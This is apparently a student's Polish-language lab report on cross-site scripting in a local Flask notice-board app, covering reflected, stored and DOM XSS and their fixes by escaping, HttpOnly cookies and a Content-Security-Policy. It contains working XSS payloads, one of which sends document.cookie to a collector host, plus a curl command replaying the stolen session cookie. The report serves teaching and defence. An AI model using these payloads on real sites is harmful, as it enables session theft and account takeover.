# ODSI — Laboratorium 6 (Cross-Site Scripting)

**Imię i nazwisko:** Wojciech Regulski
**Nr indeksu:** 337612
**GitHub:** https://github.com/WojakR/ODSI  **commit:** c5beb10

Środowisko: Docker 29.9.2, Compose v5.6.1, obraz `python:3.12-alpine`, Flask 3.1.3. Aplikacja „Tablica ogłoszeń" pod `http://127.0.0.1:8080`, zbieracz pod `http://localhost:8081`. Poprawki w `pliki-dla-studentow/aplikacja/`. Pełne ładunki, polecenia i logi: `dowody.md`.

## Zadanie 1 — XSS odbity

**Adres z ładunkiem:** `/szukaj?q=<script>document.title='XSS-odbity';document.body.style.background='red'</script>`
**Błąd:** `app.py`, wiersz 37 — parametr `q` (`fraza`) sklejany z HTML bez kodowania.

| | fragment `<h1>` odpowiedzi |
|---|---|
| **przed** | `Wyniki wyszukiwania dla: <script>document.title='XSS-odbity';…</script>` → skrypt się wykonuje (tytuł `XSS-odbity`, tło czerwone) |
| **po** | `Wyniki wyszukiwania dla: &lt;script&gt;document.title=&#x27;XSS-odbity&#x27;;…&lt;/script&gt;` → zwykły tekst |

Poprawka: `escape(fraza)`. Po zmianie `/szukaj?q=konsultacje` nadal znajduje wpis Anny.

**Wniosek:** Kodowanie wyjścia neutralizuje dowolny ładunek w kontekście HTML niezależnie od jego treści, podczas gdy usuwanie słowa `script` pomija inne wektory (`<img onerror>`, `<svg onload>`, obejścia wielkością liter) i psuje poprawne dane zawierające to słowo.

## Zadanie 2 — XSS zapisany i przejęcie sesji

**Ładunek (jako `student`):** `<img src=x onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">`

| wpis zbieracza | wartość (skrócona) |
|---|---|
| **przed** | `ZEBRANO: /?c=session=eyJ1enl0a293…` — ciasteczko Anny przechwycone, gdy otworzyła tablicę |
| **po** | brak nowego wpisu — `document.cookie` puste dla skryptu |

**Krok 3 (skradziony token, bez hasła):** `curl -i -b "session=eyJ1enl0a293…" http://127.0.0.1:8080/notatka` → zwrócono **notatkę Anny** („kod do szafki w pracowni 4721").

| nagłówek `Set-Cookie` z logowania | wartość (skrócona) |
|---|---|
| **przed** | `session=eyJ1enl0a293…; Path=/` |
| **po** | `session=eyJ1enl0a293…; HttpOnly; Path=/` |

Poprawka: `app.py`, wiersz 10 — `SESSION_COOKIE_HTTPONLY = True`.

**Wniosek:** HttpOnly tylko odbiera skryptowi dostęp do `document.cookie`, ale podatność XSS pozostaje — wstrzyknięty skrypt wciąż wykonuje się w kontekście ofiary i może zmieniać stronę, wysyłać żądania czy wyłudzać dane.

## Zadanie 3 — Naprawa i Content-Security-Policy

Szablon `tablica.html` wiersz 11: `{{ tresc|safe }}` → `{{ tresc }}` (przywrócone kodowanie Jinja2). Skrypt z `podglad.html` przeniesiony do `static/podglad.js` i zmieniony z `innerHTML` na `textContent`. Nagłówek CSP dodany dekoratorem `@app.after_request`.

| ładunek | przed | po |
|---|---|---|
| odbity `/szukaj?q=<script>…` | tytuł `XSS-odbity`, tło czerwone | tekst, tytuł `Szukaj` |
| zapisany `<img … onerror=…>` | ciasteczko w zbieraczu | tekst, brak wpisu |
| DOM `/podglad#<img … onerror=…>` | tytuł `XSS-DOM` | tekst, tytuł `Podgląd ogłoszenia` |

**Nagłówek CSP (z odpowiedzi):** `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`

**Test tekstu:** ogłoszenie `Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'` wyświetla się dosłownie — `<b>` jako tekst, nie pogrubienie. Podgląd pokazuje zwykły tekst.

**Wniosek:** CSP jest dodatkową warstwą — blokuje skrypty inline i obce źródła, ale dopuszcza `script-src 'self'`, więc samo CSP nie powstrzyma ładunku wykonanego przez własny plik JS ani nie naprawi braku kodowania; podstawą pozostaje kodowanie wyjścia w każdym kontekście.
